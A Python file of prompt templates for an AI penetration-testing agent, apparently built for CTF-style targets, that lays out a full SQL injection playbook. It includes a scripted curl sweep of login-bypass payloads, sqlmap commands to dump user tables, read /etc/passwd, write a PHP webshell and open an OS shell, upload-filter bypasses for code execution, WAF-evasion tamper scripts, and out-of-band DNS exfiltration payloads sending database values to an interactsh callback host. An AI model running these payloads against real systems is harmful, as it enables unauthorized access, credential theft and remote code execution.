"""
RedAmon SQL Injection Prompts

Prompts for SQL injection attack workflows using SQLMap and manual techniques.
Covers detection, WAF bypass, blind injection, OOB DNS exfiltration, and post-SQLi escalation.

Inspired by PR #73 (Shafranpackeer/feature/sqli-attack-module).
"""


# =============================================================================
# SQL INJECTION MAIN WORKFLOW
# =============================================================================

SQLI_TOOLS = """
## ATTACK SKILL: SQL INJECTION

**CRITICAL: This attack skill has been CLASSIFIED as SQL injection.**
**You MUST follow the SQLi workflow below. Do NOT switch to other attack methods.**

---

## PRE-CONFIGURED SETTINGS (from project settings)

```
SQLMap level: {sqli_level}  (1-5, higher = more payloads/injection points)
SQLMap risk:  {sqli_risk}   (1-3, higher = more aggressive tests)
Tamper scripts: {sqli_tamper_scripts}
```

**Always include in every `kali_shell` sqlmap call:** `--batch --random-agent`

---

## MANDATORY SQL INJECTION WORKFLOW

### GATE A (blocking) — On a LOGIN / AUTH form, auth-bypass IS the objective; DB-extraction is FORBIDDEN until the bypass sweep is exhausted and on record.

A boolean/content oracle on a login is BAIT for a database-dump rabbit hole. Seeing an oracle is
NOT permission to run `--dbs` / `--dump` / `LOAD_FILE` / `INTO OUTFILE` or to crack a hash. Those
actions are **PROHIBITED while any auth-bypass avenue on the same form is un-swept.** You may turn
to extraction, file-read, or cracking against a login ONLY AFTER the full matrix below is on record
and has failed on every cell. (This gate applies only to login/auth surfaces — for a non-login
injection where the objective genuinely is a stored row, Step 0-A still routes you to extraction.)

**Mandatory auth-bypass matrix — fill EVERY cell before any extraction, and record each result:**
- **Fields (rows): test EVERY submitted field as its own injection point — the identifier field
  (username/email) AND the secret field (password/PIN/token) AND any hidden field.** Do NOT stop
  after the identifier field. A login typically runs MORE THAN ONE query (an existence/lookup, then
  a credential check), and the SECRET field frequently interpolates into a LATER query than the
  identifier — so it is often the ONLY winning sink. **Skipping the secret field is the single most
  common reason a solvable login is wrongly declared "not bypassable."**
- **Shapes (columns): per field** — comment-truncation (`-- -`, `#`), always-true (`' OR 1=1-- -`),
  parenthesis-balanced variants, and a one-row `UNION SELECT` of a constant.
- **Oracle:** the app's own response differential (a `Success` / redirect / session-set state vs a
  wrong-credentials state) is the pass/fail signal for each cell.

**Run the whole bypass matrix as ONE scripted sweep — do NOT hand-fire probes across iterations.**
A sequential multi-probe search (send a shape, read, send the next) is the thing an agent abandons
half-done the moment a shinier extraction/crack lead appears — which loses the run. Remove that failure
mode: your FIRST exploitation action on a login MUST be a SINGLE `kali_shell` script that enumerates the
entire bypass space in one call and prints ONLY the payload whose response differs from the wrong-
credentials baseline. Enumerate mechanically; do not reason your way down to one guess. The sweep space:
- **every submitted field** as the injection point (identifier, secret/password, hidden), holding the
  OTHER fields at values that pass earlier checks (for an existence oracle, an identifier you have
  confirmed valid via the oracle);
- **every breakout shape**: comment styles (`-- -`, `#`), always-true (`OR 1=1`, `OR 'a'='a'`), and a
  one-row `UNION SELECT`;
- **a RANGE of closing-paren counts** prepended before the tail (0, 1, 2, 3, … up through several — 5-6
  is ample, deeper nesting is rare). A value interpolated INSIDE function calls (a password inside
  `MD5(...)` / `CONCAT(...)` / a cast) needs its enclosing parens balanced before `OR` parses, and you
  do NOT know the nesting depth a priori — the script tries the whole range and READS which one flips.
  A field being wrapped in a hash is NOT evidence it is un-injectable; it is a prime breakout point.

Generic skeleton — adapt endpoint + field names to the live form; keep it fully generic, memorise no
value (uses only placeholders + enumerated ranges):

    URL="http://<target>/<login-endpoint>"
    BASE=$(curl -s "$URL" --data-urlencode "<idfield>=<an-id-the-oracle-says-is-valid>" --data-urlencode "<secretfield>=wrongpw")
    for FIELD in <idfield> <secretfield> <hiddenfields...>; do
      for CLOSE in "" ")" "))" ")))" "))))" ")))))"; do
        for TAIL in "OR 1=1-- -" "OR 1=1#" "OR 'a'='a'-- -" "UNION SELECT 1-- -"; do
          P="'$CLOSE $TAIL"
          R=$(curl -s "$URL" --data-urlencode "$FIELD=$P" --data-urlencode "<other-fields=benign/valid>")
          test "$R" != "$BASE" && echo "FLIP field=$FIELD payload=[$P] -> $R"
        done
      done
    done

A FLIP printed by the sweep is a CONFIRMED bypass, not a lead to re-derive. Replay it by copying the
EXACT payload string the sweep emitted, byte-for-byte, into a request that persists cookies (a cookie
jar), then pivot to the authenticated surface (Step 7). Do NOT retype it, adjust its paren count, or
"try a similar" always-true / UNION shape — a hand-guessed variant that fails proves nothing about the
FLIP, because the winning breakout depth/shape is exactly what the sweep already found for you. If a
replay does NOT reproduce the authenticated / redirect / session-set state, the cause is a mangled or
guessed payload or a dropped session cookie, NEVER a "false positive": re-run the exact logged payload
with the cookie jar before you draw any conclusion. Declaring a printed FLIP a non-reproducible false
positive (and returning to extraction/cracking) is a FORBIDDEN move — it has thrown away winnable runs.
You may declare the login non-bypassable ONLY if the sweep printed NO FLIP across ALL fields, shapes,
and paren depths; any FLIP on record forbids that conclusion outright.

**Two inferences FORBIDDEN until that scripted sweep has RUN and printed nothing (each has cost whole runs):**
- **"The password is verified in application code, so a SQL bypass is impossible."** Not admissible from
  a shallow `OR 1=1` that failed — a login returning a distinct wrong-password state is still running SQL
  you have not fully broken out of. The full sweep (all fields, all depths) must be on record first.
- **Forging a `UNION SELECT` row that returns a password hash whose plaintext you know.** A login that
  RE-DERIVES the hash server-side (any `password = <FUNC>( ... )` shape) can NEVER match an injected hash
  — it recomputes from the stored identifier/salt, not from your row. A wrong-password result there means
  "keep breaking out of the query," NOT "switch to cracking." Do not manufacture MD5 / bcrypt / double-
  hash rows for a re-hashing login; that is an unwinnable side-quest.

Only when the scripted sweep — every field × shape × paren depth — is on record and empty may you treat
the login as non-bypassable and move on.

### Step 0: Triage the objective and the injection surface FIRST (decision gate)

Before extracting anything, answer two questions and let them route the whole workflow.
Do NOT default to dumping the database — extraction is one primitive, not the goal.

**A. WHERE is the objective most likely to live?** You usually will NOT know a priori --
let evidence (the app's function, schema enumeration, the stated goal) route you, and revise
as you learn. The point is only that **extraction is one primitive, not the default**:
- If the objective is **a stored record** (a credential, token, or row in a table) -> boolean /
  UNION / error-based extraction is appropriate; proceed with the extraction steps below.
- If evidence shows it is **on disk, or the goal is code execution** -> extraction is the wrong
  tool; consider file read (`LOAD_FILE`, `sqlmap --file-read`), file write / webshell drop
  (`INTO OUTFILE`, `sqlmap --file-write`), or an **application-level pivot** to authenticated
  functionality (uploads, import/export, admin actions, second-order sinks). Do not commit to
  blind extraction until you have reason to believe the objective is actually a DB row.

**Blind-oracle stability (verify before AND during extraction).** A boolean or time
oracle is only valid if its TRUE/FALSE signal stays STABLE across the dozens of
requests extraction needs. Confirm it on a known-true AND a known-false condition
first. If the session is cookie-bound, the cookie can EXPIRE mid-run and INVERT the
signal, corrupting output (garbage like all-1s, length-1, or all identical chars).
Re-establish and pin the session per batch, and prefer a SESSION-INDEPENDENT oracle
(an error-based toggle, e.g. a conditional that flips the HTTP status code) when the
cookie-bound one proves noisy. The instant a known-true condition stops returning
true, STOP and re-verify the oracle before trusting any extracted character.

**B. Is the injectable surface a LOGIN / AUTH form with a content/boolean oracle?**
If yes, the value of the injection is the ACCESS it unlocks, not the DB contents. FIRST test it
as an **authentication bypass**, and if a session is granted, PIVOT immediately to the
authenticated attack surface (Step 7) before any char-by-char extraction. Treat the bypass as an
exhaustive sweep, NOT a single guess:
- Test the bypass in **every injectable parameter** (username AND password AND any hidden field),
  not just the first one.
- Try **multiple payload shapes** per field: comment-out (`-- -`, `#`), always-true
  (`' OR 1=1-- -`), balanced-parenthesis variants (close the extra `)` your context opened before
  `OR` / `UNION`), and `UNION SELECT` of a constant row.
- Login handlers frequently run **more than one query** (an existence check, THEN a credential
  check) and may compute the password hash inside SQL. A payload that satisfies the first query
  can leave the second intact, so the winning sink may be a **different field or the second
  query**. A single failed comment payload does NOT prove bypass is impossible — you may only
  conclude "no auth bypass" after the full (field x shape) sweep is on record.

**B1. Second-order / value-reuse injection (decisive for multi-query logins).**
When a login (or any workflow) fetches a value in one query and then interpolates that FETCHED
value into a later query, the later query's real injection point is the DATA you can make the
first query return -- NOT your raw input field. Direct payloads in your own input often cannot
bypass here, because the second query re-derives its comparison from the genuine row and still
demands the real secret. So a clean auth form that resists every direct payload is NOT proof the
class is dead -- it is the signal to look for value-reuse. Handle it mechanically, and do NOT
declare "no auth bypass" until you have tried it:
  1. Infer the structure from the oracle: if a valid-identifier payload flips the response
     independently of the password, assume an existence/lookup query feeds a later credential
     query, and that the looked-up value is reused downstream.
  2. Use `UNION SELECT '<marker>'` in the first field to CONTROL the exact string the first query
     returns; confirm you control it by reflecting a benign unique marker end to end.
  3. Once you control that returned value, embed a SQL breakout INSIDE it -- a quote plus a comment
     to truncate the later query's remaining conditions, or a `UNION SELECT` that yields one row --
     so the later query returns a row WITHOUT the real secret. A row returned there IS the session
     grant; pivot to Step 7 immediately.
Because the payload travels through the database before detonating, escape and quote it for the
SECOND query's context, not the first (a literal quote inside a string literal is written by
doubling it). This is standard second-order injection and generalizes to any place a stored or
just-fetched value is concatenated into a later query.

### Step 1: Target Analysis (execute_curl)

Send a baseline request to the target URL and capture the normal response:

1. Use `execute_curl` to make a normal GET/POST request to the target endpoint
2. Identify injectable parameters: query string, POST body, headers, cookies
3. Check response for technology hints:
   - `Server` header (Apache, Nginx, IIS → hints at OS and DBMS)
   - `X-Powered-By` header (PHP, ASP.NET, Java)
   - Error messages containing SQL keywords (MySQL, PostgreSQL, ORA-, MSSQL)
4. Note the normal response length and status code (needed for blind detection)

**After Step 1, request `transition_phase` to exploitation before proceeding to Step 2.**
This unlocks the full exploitation toolset and ensures findings are tracked correctly.

### Step 2: Quick SQLMap Detection (kali_shell, <120s)

Run an initial SQLMap scan to detect injection points and DBMS:

```
kali_shell("sqlmap -u 'TARGET_URL' --batch --random-agent --level={sqli_level} --risk={sqli_risk} --dbs")
```

**If tamper scripts are configured**, add them:
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --random-agent --level={sqli_level} --risk={sqli_risk} --tamper={sqli_tamper_scripts} --dbs")
```

**For POST requests**, use `--data`:
```
kali_shell("sqlmap -u 'TARGET_URL' --data='param1=value1&param2=value2' -p param1 --batch --random-agent --dbs")
```

**For cookie-based injection**, use `--cookie`:
```
kali_shell("sqlmap -u 'TARGET_URL' --cookie='session=abc123' --level=2 --batch --random-agent --dbs")
```

**If the oracle only reacts when a VALID value prefixes your payload** (e.g. the boolean sits on
top of an existence/lookup check, so `nonexistent' OR ...` and `nonexistent' AND ...` look
identical), sqlmap's stock payloads will report "not injectable" because they never satisfy the
lookup. Seed it with a known-good value and pin the context so its payloads reach the live branch:
```
kali_shell("sqlmap -u 'TARGET_URL' --data='user=<known-good>&pass=x' -p user --prefix=\"' \" --suffix=\"-- -\" --batch --random-agent")
```
A single "not injectable" verdict does NOT close the class — re-test manually with the oracle
before abandoning it.

Parse the output for:
- DBMS type (MySQL, MSSQL, PostgreSQL, Oracle, SQLite)
- Injectable parameters and injection type
- Whether a WAF/IPS was detected

### Step 3: WAF Detection & Bypass

If SQLMap reports WAF/IPS detection or you get 403/406 responses:

1. **Retry with tamper scripts** — effective combinations:
   - **Generic WAF**: `--tamper=space2comment,randomcase,charencode`
   - **ModSecurity**: `--tamper=modsecurityversioned,space2comment`
   - **MySQL WAF**: `--tamper=space2hash,versionedkeywords`
   - **MSSQL WAF**: `--tamper=space2mssqlblank,randomcase`
   - **Aggressive**: `--tamper=between,equaltolike,base64encode,charencode`

2. **Reduce detection surface**:
   - Add `--delay=1` to slow down requests
   - Add `--random-agent` (already default)
   - Try `--technique=T` (time-based only — stealthiest)

3. **Manual bypass via execute_curl** if SQLMap fails entirely:
   - Test with encoded payloads: `%27%20OR%201=1--`
   - Test with comment obfuscation: `'/**/OR/**/1=1--`
   - Test case variation: `' oR 1=1--`

### Step 4: Exploitation (based on detected technique)

**Error-based / Union-based** (fastest):
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --random-agent --dbs")
kali_shell("sqlmap -u 'TARGET_URL' --batch --random-agent --tables -D database_name")
kali_shell("sqlmap -u 'TARGET_URL' --batch --random-agent --dump -T table_name -D database_name")
```

**Time-based blind** (slow — may need background mode):
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --random-agent --technique=T --dbs")
```
If this exceeds 120s → use **Long Scan Mode** (Step 5).

**Boolean-based blind**:
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --random-agent --technique=B --dbs")
```

**Out-of-Band (OOB/DNS exfiltration)**:
When blind injection is confirmed but time-based is too slow or unreliable,
follow the **OOB SQL Injection Workflow** section below.

### Step 5: Long Scan Mode (if scan exceeds 120s)

For complex targets (blind injection, large databases), run sqlmap in background:

**Start background scan:**
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --random-agent [args] > /tmp/sqlmap_out.txt 2>&1 & echo $!")
```
→ Note the PID from the output.

**Poll progress** (run periodically):
```
kali_shell("tail -50 /tmp/sqlmap_out.txt")
```

**Check if still running:**
```
kali_shell("ps aux | grep 'sqlmap' | grep -v grep")
```

**Read final output when done:**
```
kali_shell("cat /tmp/sqlmap_out.txt | tail -200")
```

### Step 6: Data Extraction Priority

Extract data in this order (most useful first):

1. **Database version**: `--banner`
2. **Current user**: `--current-user`
3. **All databases**: `--dbs`
4. **Tables in target DB**: `--tables -D <database>`
5. **Columns**: `--columns -T <table> -D <database>`
6. **Dump sensitive data**: `--dump -T users -D <database>`

For targeted extraction (faster than full dump):
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --random-agent -D dbname -T users --dump --threads=5")
```

**Anti-deadlock — blind extraction is a last resort, and it is bounded:**
Char-by-char boolean/time-based extraction is slow and easy to get stuck in. Before committing to
it, re-confirm (Step 0-A) that the objective actually IS a database row. If schema enumeration
shows no table/column that could hold the objective, or the objective is a filesystem artifact,
STOP extracting and pivot — auth-bypass access, `LOAD_FILE` / `INTO OUTFILE`, or an app-level RCE
surface. Do NOT keep extracting version / current-user / schema once they are no longer on the
path to the objective; enumerating DBMS metadata is not progress toward an objective that does not live in the database.

**Do NOT crack a retrieved password hash to "log in."** If the objective is ACCESS and any
auth-bypass avenue (Gate A) is still un-swept, cracking a dumped hash is almost never the intended
path — a deliberately strong or placeholder secret is a standard bait, and burning iterations on a
password the challenge chose to be uncrackable is a classic dead-end. Cracking is a legitimate axis
ONLY when the secret ITSELF is the objective. Never spend more than one bounded attempt cracking a
credential while a Gate A cell is unfilled; if your cracking tool fails to run (missing OpenCL,
wordlist errors, etc.), that is a signal to pivot, not to keep re-invoking it.

### Step 7: Post-SQLi Escalation (if possible)

Attempt these ONLY if initial exploitation succeeded:

**Pivot to authenticated functionality (when the injection was an AUTH BYPASS):**
Gaining a valid session IS an exploitation success. The highest-value next move is usually the
app's own now-reachable authenticated features — file upload, import/export, profile/admin
actions, or any sink that stores or reflects user input — which frequently lead to RCE or a
direct file read faster than any further SQL. Enumerate the authenticated surface with the new
session BEFORE returning to database work.

**Mandatory post-auth re-recon (a session opens NEW surface).** The instant a bypass grants a
session, you MUST (a) re-run content discovery AUTHENTICATED (crawl links + dir-fuzz while sending
the session cookie) — dashboards, upload/import, admin, and profile pages were invisible pre-login
and only appear now; and (b) if the newly reachable surface is a DIFFERENT vulnerability class,
`switch_skill` to it instead of forcing more SQL tradecraft onto a non-SQL sink.

**If the new surface is a file upload / import:** the extension/type check is frequently a substring
match, a client-side-only check, or Content-Type-only. Bypass it generically and then REQUEST the
stored file to trigger execution:
- **Double extension** — name the file so it both contains a permitted extension AND ends in an
  executable one (e.g. `x.jpg.php`, `x.jpg.phtml`) when the server only checks that the name
  *contains* an allowed type or trusts the last-but-one segment.
- **Content-Type spoof** — send an allowed MIME (`image/png`, `image/jpeg`) with executable bytes
  when only the declared type is validated.
- **Magic-byte prefix** — prepend allowed file-signature bytes (e.g. `GIF89a` / `\x89PNG`) ahead of
  your code when server-side content sniffing is used.
- **Case / trailing tricks** — `.PhP`, trailing dot/space/null on the name.
A dropped file the server then EXECUTES is code execution; use it to read the objective from disk
(the target flag/file often lives outside the web root, e.g. at filesystem root or `/`). If a
dedicated upload/RCE skill is available, `switch_skill` to it for the full playbook.

**File read** (requires FILE privilege):
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --file-read='/etc/passwd'")
```

**File write** (requires FILE privilege + writable directory):
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php")
```

**OS shell** (requires stacked queries + high privileges):
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --os-shell")
```

**SQL shell** (interactive SQL access):
```
kali_shell("sqlmap -u 'TARGET_URL' --batch --sql-shell --sql-query='SELECT user,password FROM users'")
```
"""


# =============================================================================
# OOB (OUT-OF-BAND) SQL INJECTION WORKFLOW
# =============================================================================

SQLI_OOB_WORKFLOW = """
## OOB SQL Injection Workflow (Blind SQLi with DNS Exfiltration)

**Use this when:** blind injection is confirmed, time-based is too slow or unreliable,
or WAF blocks inline output. Requires `interactsh-client` installed in kali-sandbox.

---

### Setting Up Interactsh Callback Domain

**Step 1: Start interactsh-client as a background process**
Replace `RUN` with a short random token you pick once for this workflow (for example the output of `openssl rand -hex 4`) and reuse it in every file name: all your chats share your sandbox's `/tmp`, so a fixed name would read another chat's callbacks as this one's.
```
kali_shell("interactsh-client -server oast.fun -json -v > /tmp/interactsh-RUN.log 2>&1 & echo $!")
```
→ **Save the PID** from the output for later cleanup.

**Step 2: Wait and read the registered domain**
```
kali_shell("sleep 5 && head -20 /tmp/interactsh-RUN.log")
```
→ Look for a line containing the `.oast.fun` domain (e.g., `abc123xyz.oast.fun`)
→ **IMPORTANT:** This domain is cryptographically registered with the server.
   Random strings will NOT work — you MUST use the domain from this output.

**Step 3: Use the domain in OOB payloads**

**Option A — SQLMap DNS exfiltration (PREFERRED — handles everything):**
```
kali_shell("sqlmap -u 'TARGET_URL' --dns-domain=REGISTERED_DOMAIN --batch --random-agent --dbs")
```

**Option B — Manual DBMS-specific payloads via execute_curl:**

MySQL (Windows servers only — UNC path):
```sql
' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.DOMAIN\\\\a'))--
' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',user(),'.DOMAIN\\\\a'))--
```

MSSQL (xp_dirtree — most reliable):
```sql
'; EXEC master..xp_dirtree '\\\\DOMAIN\\a'--
'; DECLARE @x VARCHAR(99); SET @x='DOMAIN'; EXEC master..xp_dirtree '\\\\'+@x+'\\a'--
```

Oracle (UTL_HTTP):
```sql
' AND UTL_HTTP.REQUEST('http://'||user||'.DOMAIN/')=1--
' AND HTTPURITYPE('http://'||user||'.DOMAIN/').GETCLOB()=1--
```

PostgreSQL (dblink/COPY):
```sql
'; COPY (SELECT '') TO PROGRAM 'nslookup '||current_user||'.DOMAIN'--
'; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host='||current_user||'.DOMAIN')--
```

**Step 4: Poll for interactions**
```
kali_shell("cat /tmp/interactsh-RUN.log | tail -50")
```
→ Look for JSON lines with `"protocol":"dns"` containing exfiltrated data as subdomain
→ Example: `{"protocol":"dns","full-id":"5.7.38.abc123xyz.oast.fun"}` means DB version is 5.7.38

**Step 5: Cleanup when done**
```
kali_shell("kill SAVED_PID")
```
"""


# =============================================================================
# SQL INJECTION PAYLOAD REFERENCE
# =============================================================================

SQLI_PAYLOAD_REFERENCE = """
## SQLi Payload Reference

### Auth Bypass Payloads (login forms)
**Sweep, do not single-shot.** Try EACH payload below in EVERY injectable field (username AND
password), not just one field with one payload. Watch the app's own response differential as the
oracle (a distinct success / redirect / session-set state vs a wrong-credentials state). Login
logic may run multiple queries, so a payload that fails in one field can succeed in another — only
declare "no auth bypass" after all (fields x shapes) are on record. A granted session is the win;
pivot to the authenticated surface immediately.
Use these with `execute_curl` to test login forms for authentication bypass:
```
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1--
" OR 1=1--
admin'--
admin' OR '1'='1
admin'/*
') OR ('1'='1
')) OR (('1'='1
' OR 'x'='x
1' OR '1'='1' -- -
' UNION SELECT 'admin','password'--
' OR 1=1 LIMIT 1--
' OR 1=1#
```

**Second-order (multi-query logins):** if the app reuses a value it just SELECTed as a string in
a later query, inject THROUGH that returned value, not your input field. Make the first query
return your payload, e.g. `x' UNION SELECT '<your second-query breakout>'-- -`, and let it detonate
in the later query (comment out its remaining credential check, or `UNION SELECT` one row). Direct
payloads that fail against a two-query login are the cue to try this, not to abandon the class.

### WAF Bypass Encoding Quick Reference
| Technique | Example | Use When |
|-----------|---------|----------|
| Hex | `0x27` for `'` | Keyword/char blocked |
| CHAR() | `CHAR(39)` for `'` (MySQL) | Quotes blocked |
| CHR() | `CHR(39)` for `'` (Oracle/PG) | Quotes blocked |
| Comment | `S/**/ELECT` | Keyword blocked |
| Case | `sElEcT` | Case-sensitive WAF |
| Double URL | `%2527` for `'` | Single-decode WAF |
| Unicode | `%u0027` for `'` | Unicode-aware WAF |
| Null byte | `%00'` | Null-terminated parsing |

### SQLMap Tamper Script Quick Reference
| Script | Effect | Best For |
|--------|--------|----------|
| `space2comment` | Space → `/**/` | Generic WAF |
| `randomcase` | `RaNdOm CaSe` | Keyword filters |
| `charencode` | URL-encode all chars | Generic WAF |
| `between` | `>` → `NOT BETWEEN 0 AND` | Operator filters |
| `equaltolike` | `=` → `LIKE` | Operator filters |
| `base64encode` | Base64-encode payload | Content filters |
| `modsecurityversioned` | MySQL `/*!*/` comments | ModSecurity |
| `space2hash` | Space → `#` + newline | MySQL WAF |
| `space2mssqlblank` | MSSQL alt whitespace | MSSQL WAF |
| `versionedkeywords` | MySQL versioned comments | MySQL WAF |

### Error-Based Extraction (by DBMS)
- **MySQL**: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--`
- **MySQL alt**: `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--`
- **MSSQL**: `' AND 1=CONVERT(int,(SELECT @@version))--`
- **MSSQL alt**: `' AND 1=CAST((SELECT @@version) AS int)--`
- **Oracle**: `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM DUAL))--`
- **PostgreSQL**: `' AND 1=CAST((SELECT version()) AS int)--`

### Time-Based Detection (by DBMS)
- **MySQL**: `' AND SLEEP(5)--` or `' AND IF(1=1,SLEEP(5),0)--`
- **MSSQL**: `'; WAITFOR DELAY '0:0:5'--`
- **Oracle**: `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--`
- **PostgreSQL**: `' AND 1=(SELECT 1 FROM pg_sleep(5))--`
- **SQLite**: `' AND 1=randomblob(500000000)--`
"""
